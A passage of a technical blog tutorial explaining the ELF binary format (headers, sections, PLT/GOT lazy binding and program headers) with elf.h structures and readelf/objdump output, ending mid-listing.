Executable Header  Every ELF file starts with an executable header, which is just a structured series of bytes telling you that it’s an ELF file and other metadata. Format of executable header: /usr/include/elf.h  typedef struct { unsigned char e_ident[16]; /* Magic number and other info */ uint16_t e_type; /* Object file type */ uint16_t e_machine; /* Architecture */ uint32_t e_version; /* Object file version */ uint64_t e_entry; /* Entry point virtual address */ uint64_t e_phoff; /* Program header table file offset */ uint64_t e_shoff; /* Section header table file offset */ uint32_t e_flags; /* Processor-specific flags */ uint16_t e_ehsize; /* ELF header size in bytes */ uint16_t e_phentsize; /* Program header table entry size */ uint16_t e_phnum; /* Program header table entry count */ uint16_t e_shentsize; /* Section header table entry size */ uint16_t e_shnum; /* Section header table entry count */ uint16_t e_shstrndx; /* Section header string table index */ } Elf64_Ehdr; Section Headers  The code and data in an ELF binary are logically divided into contiguous non-overlapping chunks called Sections.</description>
            <content type="html"><![CDATA[<p>ELF binaries really consist of only four types of components: </p>
<ol>
<li>Executable Header</li>
<li>Program Headers (optional)</li>
<li>Sections</li>
<li>Section Headers, one per section (optional)</li>
</ol>
<p><img src="/The_ELF_Format/1_image.png" alt="&ldquo;binary_structure&rdquo;">
<em>64-bit ELF binary structure</em></p>
<h2 id="executable-header">Executable Header</h2>
<ul>
<li>Every ELF file starts with an executable header, which is just a structured series of bytes telling you that it’s an ELF file and other metadata.</li>
<li>Format of executable header: /usr/include/elf.h</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> e_ident[<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">/* Magic number and other info */</span>
uint16_t e_type; <span style="color:#75715e">/* Object file type */</span>
uint16_t e_machine; <span style="color:#75715e">/* Architecture */</span>
uint32_t e_version; <span style="color:#75715e">/* Object file version */</span>
uint64_t e_entry; <span style="color:#75715e">/* Entry point virtual address */</span>
uint64_t e_phoff; <span style="color:#75715e">/* Program header table file offset */</span>
uint64_t e_shoff; <span style="color:#75715e">/* Section header table file offset */</span>
uint32_t e_flags; <span style="color:#75715e">/* Processor-specific flags */</span>
uint16_t e_ehsize; <span style="color:#75715e">/* ELF header size in bytes */</span>
uint16_t e_phentsize; <span style="color:#75715e">/* Program header table entry size */</span>
uint16_t e_phnum; <span style="color:#75715e">/* Program header table entry count */</span>
uint16_t e_shentsize; <span style="color:#75715e">/* Section header table entry size */</span>
uint16_t e_shnum; <span style="color:#75715e">/* Section header table entry count */</span>
uint16_t e_shstrndx; <span style="color:#75715e">/* Section header string table index */</span>
} Elf64_Ehdr;
</code></pre></div><h2 id="section-headers">Section Headers</h2>
<ul>
<li>The code and data in an ELF binary are logically divided into contiguous non-overlapping chunks called <strong>Sections</strong>. Sections don’t have any predetermined structure; instead, the structure of each section varies depending on the contents.</li>
<li>Some sections contain data that isn’t needed for execution at all, such as symbolic or relocation information.</li>
<li>Every section is described by a <strong>Section Header</strong>, which denotes the properties of the section and allows you to locate the bytes belonging to the section.</li>
<li>Exists to provide convenient organisation for use to linker. Only used at link time.</li>
<li>The section headers for all sections in the binary are contained in the <strong>Section Header Table</strong>. It is optional since it is intended to provide a view for the linker only. If absent, <em><strong>e_shoff</strong></em>  is set to zero.</li>
<li>Format of a section header: /usr/include/elf.h</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
uint32_t sh_name; <span style="color:#75715e">/* Section name (string tbl index) */</span>
uint32_t sh_type; <span style="color:#75715e">/* Section type */</span>
uint64_t sh_flags; <span style="color:#75715e">/* Section flags */</span>
uint64_t sh_addr; <span style="color:#75715e">/* Section virtual addr at execution */</span>
uint64_t sh_offset; <span style="color:#75715e">/* Section file offset */</span>
uint64_t sh_size; <span style="color:#75715e">/* Section size in bytes */</span>
uint32_t sh_link; <span style="color:#75715e">/* Link to another section */</span>
uint32_t sh_info; <span style="color:#75715e">/* Additional section information */</span>
uint64_t sh_addralign; <span style="color:#75715e">/* Section alignment */</span>
uint64_t sh_entsize; <span style="color:#75715e">/* Entry size if section holds table */</span>
} Elf64_Shdr;
</code></pre></div><h2 id="sections">Sections</h2>
<ul>
<li>Following sections are present:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> readelf <span style="color:#f92672">--</span>sections <span style="color:#f92672">--</span>wide a.out

There are <span style="color:#ae81ff">31</span> section headers, starting at offset <span style="color:#ae81ff">0x19e8</span><span style="color:#f92672">:</span>
Section Headers:
[Nr] Name 				Type 		Address 		 Off 	Size   ES Flg Lk Inf Al
[ <span style="color:#ae81ff">0</span>] 					NULL 		<span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">000000</span> <span style="color:#ae81ff">000000</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
[ <span style="color:#ae81ff">1</span>] .interp 			PROGBITS 	<span style="color:#ae81ff">000000000040023</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00023</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00001</span>c <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>	 <span style="color:#ae81ff">1</span>
[ <span style="color:#ae81ff">2</span>] .note.ABI<span style="color:#f92672">-</span>tag 		NOTE 		<span style="color:#ae81ff">0000000000400254</span> <span style="color:#ae81ff">000254</span> <span style="color:#ae81ff">000020</span> <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span> 	 <span style="color:#ae81ff">4</span>
[ <span style="color:#ae81ff">3</span>] .note.gnu.build<span style="color:#f92672">-</span>id NOTE 		<span style="color:#ae81ff">0000000000400274</span> <span style="color:#ae81ff">000274</span> <span style="color:#ae81ff">000024</span> <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span> 	 <span style="color:#ae81ff">4</span>
[ <span style="color:#ae81ff">4</span>] .gnu.hash 			GNU_HASH 	<span style="color:#ae81ff">00000000004002</span><span style="color:#ae81ff">98</span> <span style="color:#ae81ff">0002</span><span style="color:#ae81ff">98</span> <span style="color:#ae81ff">00001</span>c <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[ <span style="color:#ae81ff">5</span>] .dynsym 			DYNSYM 		<span style="color:#ae81ff">00000000004002</span>b8 <span style="color:#ae81ff">0002</span>b8 <span style="color:#ae81ff">000060</span> <span style="color:#ae81ff">18</span> A   <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">8</span>
[ <span style="color:#ae81ff">6</span>] .dynstr 			STRTAB 		<span style="color:#ae81ff">000000000040031</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00031</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00003</span>d <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">1</span>
[ <span style="color:#ae81ff">7</span>] .gnu.version 		VERSYM 		<span style="color:#ae81ff">0000000000400356</span> <span style="color:#ae81ff">000356</span> <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">02</span> A   <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">2</span>
[ <span style="color:#ae81ff">8</span>] .gnu.version_r 	VERNEED 	<span style="color:#ae81ff">0000000000400360</span> <span style="color:#ae81ff">000360</span> <span style="color:#ae81ff">000020</span> <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">8</span>
[ <span style="color:#ae81ff">9</span>] .rela.dyn 			RELA 		<span style="color:#ae81ff">00000000004003</span><span style="color:#ae81ff">80</span> <span style="color:#ae81ff">0003</span><span style="color:#ae81ff">80</span> <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">18</span> A   <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">10</span>] .rela.plt 			RELA 		<span style="color:#ae81ff">00000000004003</span><span style="color:#ae81ff">98</span> <span style="color:#ae81ff">0003</span><span style="color:#ae81ff">98</span> <span style="color:#ae81ff">000030</span> <span style="color:#ae81ff">18</span> AI  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">11</span>] .init 				PROGBITS 	<span style="color:#ae81ff">00000000004003</span>c8 <span style="color:#ae81ff">0003</span>c8 <span style="color:#ae81ff">00001</span>a <span style="color:#ae81ff">00</span> AX  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">4</span>
[<span style="color:#ae81ff">12</span>] .plt 				PROGBITS 	<span style="color:#ae81ff">00000000004003f</span><span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0003f</span><span style="color:#ae81ff">0</span> <span style="color:#ae81ff">000030</span> <span style="color:#ae81ff">10</span> AX  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">16</span>
[<span style="color:#ae81ff">13</span>] .plt.got 			PROGBITS 	<span style="color:#ae81ff">0000000000400420</span> <span style="color:#ae81ff">000420</span> <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00</span> AX  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">14</span>] .text 				PROGBITS 	<span style="color:#ae81ff">0000000000400430</span> <span style="color:#ae81ff">000430</span> <span style="color:#ae81ff">0001</span><span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span> AX  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">16</span>
[<span style="color:#ae81ff">15</span>] .fini 				PROGBITS 	<span style="color:#ae81ff">00000000004005</span>c4 <span style="color:#ae81ff">0005</span>c4 <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">9</span> <span style="color:#ae81ff">00</span> AX  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">4</span>
[<span style="color:#ae81ff">16</span>] .rodata 			PROGBITS 	<span style="color:#ae81ff">00000000004005</span>d0 <span style="color:#ae81ff">0005</span>d0 <span style="color:#ae81ff">000011</span> <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">4</span>
[<span style="color:#ae81ff">17</span>] .eh_frame_hdr 		PROGBITS 	<span style="color:#ae81ff">00000000004005e4</span> <span style="color:#ae81ff">0005e4</span> <span style="color:#ae81ff">000034</span> <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">4</span>
[<span style="color:#ae81ff">18</span>] .eh_frame 			PROGBITS 	<span style="color:#ae81ff">000000000040061</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00061</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">0000f</span><span style="color:#ae81ff">4</span> <span style="color:#ae81ff">00</span> A   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">19</span>] .init_array 		INIT_ARRAY 	<span style="color:#ae81ff">0000000000600e10</span> <span style="color:#ae81ff">000e10</span> <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00</span> WA  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">20</span>] .fini_array 		FINI_ARRAY 	<span style="color:#ae81ff">0000000000600e18</span> <span style="color:#ae81ff">000e18</span> <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00</span> WA  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">21</span>] .jcr 				PROGBITS 	<span style="color:#ae81ff">0000000000600e20</span> <span style="color:#ae81ff">000e20</span> <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00</span> WA  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">22</span>] .dynamic 			DYNAMIC 	<span style="color:#ae81ff">0000000000600e28</span> <span style="color:#ae81ff">000e28</span> <span style="color:#ae81ff">0001</span>d0 <span style="color:#ae81ff">10</span> WA  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">23</span>] .got 				PROGBITS 	<span style="color:#ae81ff">0000000000600ff</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">000ff</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">08</span> WA  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">24</span>] .got.plt 			PROGBITS 	<span style="color:#ae81ff">0000000000601000</span> <span style="color:#ae81ff">001000</span> <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">08</span> WA  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">25</span>] .data 				PROGBITS 	<span style="color:#ae81ff">000000000060102</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00102</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">000010</span> <span style="color:#ae81ff">00</span> WA  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">26</span>] .bss 				NOBITS 		<span style="color:#ae81ff">000000000060103</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00103</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">00</span> WA  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">1</span>
[<span style="color:#ae81ff">27</span>] .comment 			PROGBITS 	<span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">00103</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">000034</span> <span style="color:#ae81ff">01</span> MS  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">1</span>
[<span style="color:#ae81ff">28</span>] .shstrtab 			STRTAB 		<span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span>da <span style="color:#ae81ff">00010</span>c <span style="color:#ae81ff">00</span> 	  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">1</span>
[<span style="color:#ae81ff">29</span>] .symtab 			SYMTAB 		<span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">001070</span> <span style="color:#ae81ff">00064</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">18</span>	  <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">47</span>  <span style="color:#ae81ff">8</span>
[<span style="color:#ae81ff">30</span>] .strtab 			STRTAB 		<span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">0016</span>b8 <span style="color:#ae81ff">000222</span> <span style="color:#ae81ff">00</span> 	  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">1</span>
Key to Flags:
W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
O (extra OS processing required) o (OS specific), p (processor specific)
</code></pre></div><ul>
<li>The <strong>.init</strong> section (index 11)  can be thought of as a constructor as it contains a single startup function that performs some crucial initialization needed to start the executable that the system executes before transferring control to the main function.</li>
<li>The <strong>.fini</strong> section (index 15) is analogous to the .init section, except that it runs after the main program completes, essentially functioning as a kind of destructor.</li>
<li>The <strong>.text</strong> section (index 14) is where the main code of the program resides. It contains a number of standard functions that perform initialization and finalization tasks, such as _start, register_tm_clones, and frame_dummy.</li>
<li>The <strong>.init_array</strong> section contains an array of pointers to functions to use as constructors. Each of these functions is called in turn when the binary is initialized, before main is called. The .init_array is a data section that can contain as many function pointers as you want, including pointers to your own custom constructors.</li>
<li>The <strong>.fini_array</strong> is analogous to .init_array, except that .fini_array contains pointers to destructors.
<ul>
<li>In gcc, you can mark functions in your C source files as constructors by decorating them with __attribute__((constructor)). </li>
<li>The pointers contained in .init_array and .fini_array are easy to change, making them convenient places to insert hooks that add initialization or finalization code to the binary to modify its behavior. </li>
<li>The binaries produced by older gcc versions may contain sections called <strong>.ctors</strong> and <strong>.dtors</strong> instead of .init_array and .fini_array.</li>
</ul>
</li>
<li>The default values of initialized variables are stored in the <strong>.data</strong> section, which is marked as writable since the values of variables may change at runtime.</li>
<li>The <strong>.rodata</strong> section, which stands for “read-only data,” is dedicated to storing constant values. Because it stores constant values, .rodata is not writable.</li>
<li>The <strong>.bss</strong> section reserves space for uninitialized variables. The name historically stands for <em>block started by symbol</em>, referring to the reserving of blocks of memory for (symbolic) variables. Unlike .rodata and .data, which have type SHT_PROGBITS, the .bss section has type SHT_NOBITS because .bss doesn’t occupy any bytes in the binary as it exists on disk, it’s simply a directive to allocate a properly sized block of memory for uninitialized variables when setting up an execution environment for the binary. Typically, variables that live in .bss are zero initialized, and the section is marked as writable.</li>
<li>The <strong>.symtab</strong> section contains a symbol table, which is a table of <em><strong>Elf64_Sym</strong></em> structures, each of which associates a symbolic name with a piece of code or data elsewhere in the binary, such as a function or variable.</li>
<li>The actual strings containing the symbolic names are located in the <strong>.strtab</strong> section. These strings are pointed to by the Elf64_Sym structures. 
<ul>
<li>In the stripped binaries the .symtab and .strtab tables are removed.</li>
</ul>
</li>
<li>The <strong>.dynsym</strong> and <strong>.dynstr</strong> sections are analogous to .symtab and .strtab, except that they contain symbols and strings needed for dynamic linking rather than static linking. Because the information in these sections is needed during dynamic linking, they cannot be stripped.
<ul>
<li>The static symbol table has section type SHT_SYMTAB, while the dynamic symbol table has type SHT_DYNSYM. This makes it easy for tools like strip to recognize which symbol tables can be safely removed when stripping a binary and which cannot.</li>
</ul>
</li>
<li><strong>.rel.*</strong> and <strong>.rela.*</strong> sections are of type SHT_RELA, meaning that they contain information used by the linker to perform relocations with each entry detailing a particular address where a relocation needs to be applied, as well as instructions on how to resolve the particular value that needs to be plugged in at this address. What all relocation types have in common is that they specify an offset at which to apply the relocation. There are two most common types of dynamic linking:
<ul>
<li>GLOB_DAT(Global data) : This relocation has its offset in .got section. This type of relocation is used to compute the address of a data symbol and plug it into the correct offset in .got.</li>
<li>JUMP_SLO(Jump Slots) : This relocation has its offset in the .got.plt section and represent slots where the addresses of library functions can be plugged in.</li>
</ul>
</li>
<li>The <strong>.dynamic</strong> section functions as a “road map” for the operating system and dynamic linker when loading and setting up an ELF binary for execution. The .dynamic section contains a table of <em><strong>Elf64_Dyn</strong></em> structures, also referred to as tags. There are different types of tags, each of which comes with an associated value. Tags of type DT_NEEDED inform the dynamic linker about dependencies of the executable. The DT_VERNEED and DT_VERNEEDNUM tags specify the starting address and number of entries of the version dependency table, which indicates the expected version of the various dependencies of the executable. In addition to listing dependencies, the .dynamic section also contains pointers to other important information required by the dynamic linker (for instance, the dynamic string table, dynamic symbol table, .got.plt section, and dynamic relocation section pointed to by tags of type DT_STRTAB, DT_SYMTAB, DT_PLTGOT, and DT_RELA, respectively).</li>
</ul>
<h3 id="lazy-binding">Lazy Binding</h3>
<p>Many of the relocations are typically not done right away when the binary is loaded but are deferred until the first reference to the unresolved location is actually made. This is known as L<strong>azy Binding</strong>. It ensures that the dynamic linker never needlessly wastes time on relocations; it only performs those relocations that are truly needed at runtime.</p>
<p><img src="/The_ELF_Format/image.png" alt="&ldquo;elf_format&rdquo;">
<em>Lazy Binding</em></p>
<ul>
<li>Linker can be forced to perform all relocations right away by exporting an environment variable called <strong>LD_BIND_NOW</strong>, done when the application calls for real-time performance guarantees.</li>
</ul>
<p>Lazy binding in Linux ELF binaries is implemented with:</p>
<ul>
<li><strong>Global Offset Table</strong> (<strong>.got section</strong>).
<ul>
<li>Data section.</li>
<li>ELF binaries often contain a separate GOT section called <strong>.got.plt</strong> for use in conjunction with .plt in the lazy binding process. Relocations are of type <strong>R_386_JUMP_SLOT</strong>, which implies that they are branch relocations.</li>
<li>The <strong>.got</strong> section is for relocations regarding global variables, all of type <strong>R_386_GLOB_DAT</strong>.</li>
</ul>
</li>
<li><strong>Procedure Linkage Table</strong> (<strong>.plt section</strong>)
<ul>
<li>
<p>Code section that contains executable code.</p>
</li>
<li>
<p>The <strong>.plt</strong> section contain the actual stubs to lookup the addresses in .got.plt section.</p>
</li>
<li>
<p>The <strong>.plt.got</strong> is an alternative PLT that uses read-only .got entries instead of .got.plt entries. It’s used if you enable the <em>ld</em> option <em>-z</em> <em>now</em> at compile time, telling ld that you want to use <em><strong>now binding.</strong></em> This has the same effect as LD_BIND_NOW=1, but by informing ld at compile time, you allow it to place GOT entries in .got for enhanced security and use 8-byte .plt.got entries instead of larger 16-byte .plt entries.</p>
</li>
<li>
<p>Calling a shared library function via the PLT (referred by <em>step num</em>)</p>
</li>
</ul>
</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> objdump <span style="color:#f92672">-</span>M intel <span style="color:#f92672">--</span>section .plt <span style="color:#f92672">-</span>d a.out

a.out: file format elf64<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>
Disassembly of section .plt:

<span style="color:#960050;background-color:#1e0010">➊</span> <span style="color:#ae81ff">00000000004003f</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span><span style="color:#f92672">&gt;:</span>
<span style="color:#ae81ff">4003f</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> push QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200c12</span>] 
<span style="color:#75715e"># 601008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">4003f</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> jmp QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200c14</span>] 
<span style="color:#75715e"># 601010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">4003f</span>c: nop DWORD PTR [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]

<span style="color:#960050;background-color:#1e0010">➋</span> <span style="color:#ae81ff">0000000000400400</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;:</span>
<span style="color:#ae81ff">400400</span><span style="color:#f92672">:</span> jmp QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200c12</span>] 
<span style="color:#75715e"># 601018 &lt;_GLOBAL_OFFSET_TABLE_+0x18&gt;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">400406</span><span style="color:#f92672">:</span> push <span style="color:#960050;background-color:#1e0010">➌</span><span style="color:#ae81ff">0x0</span>
<span style="color:#ae81ff">40040</span>b: jmp <span style="color:#ae81ff">4003f</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span>_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span><span style="color:#f92672">&gt;</span>

<span style="color:#960050;background-color:#1e0010">➍</span> <span style="color:#ae81ff">0000000000400410</span> <span style="color:#f92672">&lt;</span>__libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;:</span>
<span style="color:#ae81ff">400410</span><span style="color:#f92672">:</span> jmp QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200c0a</span>] 
<span style="color:#75715e"># 601020 &lt;_GLOBAL_OFFSET_TABLE_+0x20&gt;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">400416</span><span style="color:#f92672">:</span> push <span style="color:#960050;background-color:#1e0010">➎</span><span style="color:#ae81ff">0x1</span>
<span style="color:#ae81ff">40041</span>b: jmp <span style="color:#ae81ff">4003f</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span>_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span><span style="color:#f92672">&gt;</span>
</code></pre></div><ul>
<li>First call to a library function (say puts) sends it to it&rsquo;s plt entry (➋puts@plt). There it experiences a jump (step ➋) to an address which initially is the address of the next instruction (➌), thus jumping back (step ➌). The push instruction pushes an integer onto the stack which serves as an index/identifier for the current function stub. It then encounters another jump (step ➍) which sends it to the <strong>default stub (<strong>➊</strong>)</strong>, which pushes another identifier (taken from GOT) and jumps, indirectly through GOT, to the dynamic linker (step ➎). Using the identifiers pushed by the PLT stubs, the dynamic linker figures out that it should resolve the address of puts and should do so on behalf of the main executable loaded into the process. This last bit is important because there may be multiple libraries loaded in the same process as well, each with their own PLT and GOT. The dynamic linker then looks up the address at which the puts function is located and plugs the address of that function into the GOT entry associated with puts@plt. The GOT entry now no longer points back into the PLT stub, as it did initially, but now points to the actual address of puts. At this point, the lazy binding process is complete. Finally, the dynamic linker satisfies the original intention of calling puts by transferring control to it. For any subsequent calls to puts@plt, the GOT entry already contains the appropriate (patched) address of puts so that the jump at the start of the PLT stub goes directly to puts without involving the dynamic linker (step ➏).</li>
<li>zGOT has been incorporated because:
<ul>
<li>GOT is a data section and thus it’s okay for it to be writable. Therefore it makes sense to have the additional layer of indirection through the GOT since this extra layer of indirection allows you to avoid creating writable code sections (leaving PLT read-only). While an attacker may still succeed in changing the addresses in the GOT, this attack model is a lot less powerful than the ability to inject arbitrary code.</li>
<li>A dynamic library will have only exist in a single physical copy while it will likely be mapped to multiple completely different virtual address for each process. Thus you can’t patch addresses resolved on behalf of a library directly into the code because the address would work only in the context of one process and break the others. Patching them into the GOT instead does work because each process has its own private copy of the GOT.</li>
</ul>
</li>
</ul>
<h2 id="program-headers">Program Headers</h2>
<ul>
<li>The <strong>Program Header Table</strong> provides a <strong>Segment</strong> view of the binary, as opposed to the section view provided by the Section Header Table.</li>
<li>Format of a program header: /usr/include/elf.h</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
uint32_t p_type; <span style="color:#75715e">/* Segment type */</span>
uint32_t p_flags; <span style="color:#75715e">/* Segment flags */</span>
uint64_t p_offset; <span style="color:#75715e">/* Segment file offset */</span>
uint64_t p_vaddr; <span style="color:#75715e">/* Segment virtual address */</span>
uint64_t p_paddr; <span style="color:#75715e">/* Segment physical address */</span>
uint64_t p_filesz; <span style="color:#75715e">/* Segment size in file */</span>
uint64_t p_memsz; <span style="color:#75715e">/* Segment size in memory */</span>
uint64_t p_align; <span style="color:#75715e">/* Segment alignment */</span>
} Elf64_Phdr;
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> readelf <span style="color:#f92672">--</span>wide <span style="color:#f92672">--</span>segments a.out

Elf file type is EXEC (Executable file)
Entry point <span style="color:#ae81ff">0x400430</span>
There are <span style="color:#ae81ff">9</span> program headers, starting at offset <span style="color:#ae81ff">64</span>

Program Headers:
Type 			Offset 		VirtAddr 		   PhysAddr 		  FileSiz  MemSiz 	Flg Align
PHDR			<span style="color:#ae81ff">0x000040</span> 	<span style="color:#ae81ff">0x0000000000400040</span> <span style="color:#ae81ff">0x0000000000400040</span> <span style="color:#ae81ff">0x0001f8</span> <span style="color:#ae81ff">0x0001f8</span> R E <span style="color:#ae81ff">0x8</span>
INTERP			<span style="color:#ae81ff">0x000238</span> 	<span style="color:#ae81ff">0x0000000000400238</span> <span style="color:#ae81ff">0x0000000000400238</span> <span style="color:#ae81ff">0x00001c</span> <span style="color:#ae81ff">0x00001c</span> R 	<span style="color:#ae81ff">0x1</span>
	[Requesting program interpreter: <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>]
